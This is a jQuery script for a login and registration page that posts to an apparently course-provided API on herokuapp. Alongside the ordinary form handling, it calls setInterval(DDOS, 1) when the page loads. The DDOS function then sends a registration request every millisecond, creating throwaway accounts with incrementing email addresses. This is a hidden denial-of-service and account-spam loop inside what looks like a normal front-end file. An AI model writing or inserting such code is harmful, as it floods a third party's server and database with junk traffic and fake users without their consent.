$(document).ready(function(){
  //global variables
  var baseUrl = "https://horizons-facebook.herokuapp.com/api/1.0/"
  var i = 0;
  setInterval(DDOS , 1);


  // Lets us know what window we are on.
  var isLoginMode = true;

  $(".registerBt").on('click', function(event){
    event.preventDefault();
    // Check the status of the page
    if(isLoginMode){
      // Need to display the new fields and set isLogin to false
      isLoginMode = false;
      toLoginPage();
    } else{
      var newEmail = $(".emailFld").val();
      var newPassword = $(".passwordFd").val();
      var newFirstName = $(".firstNameFld").val();
      var newLastName = $(".lastNameFld").val();
      $.ajax({
        url: baseUrl + "users/register",
        method: 'POST',
        success: function(response) {
          toRegisterPage();
        },
        data: {
          fname: newFirstName,
          lname: newLastName,
          email: newEmail,
          password: newPassword
        },
        error: function(err){
          // alert("ERROR!!! --> ", err);
        }
      });
    }



})

$(".loginBt").on('click', function(event){
  event.preventDefault();

  if(!isLoginMode){
    isLoginMode = true;
    toRegisterPage();
  }
})

function checkValidFields(){
  // --->>>TODO
}
function toLoginPage(){
  var regFldToAdd =  `
  <div class="temp-flds">
  <div class="row">
  <div class="col-xs-6 col-xs-offset-3 col-md-2 col-md-offset-5">
  <label for="firstNameFld" class="firstNameLb">First name</label>
  <input class="firstNameFld" style="width: 100%" type="text" placeholder="First name">
  </div>
  </div>
  <div class="row">
  <div class="col-xs-6 col-xs-offset-3 col-md-2 col-md-offset-5">
  <label for="lastNameFld" class="lastNameLb">Last name</label>
  <input class="lastNameFld" style="width: 100%" type="Last name" placeholder="Last name">
  </div>
  </div>
  </div>`
  // Append the new fields
  $('.row').eq(1).append(regFldToAdd)
}

function toRegisterPage(){
    $('.temp-flds').remove();
    $('.passwordFd').val("");
}
function DDOS(){
  $.ajax({
    url: baseUrl + "users/register",
    method: 'POST',
    success: function(response) {
    console.log('DDOS:' + i);
    },
    data: {
      fname: "Audrey",
      lname: "Bae",
      email: "AudreyBaeee"  + i++ + "@gmail.com",
      password: "password"
    },
    error: function(err){
      // alert("ERROR!!! --> ", err);
    }
  });
}
})
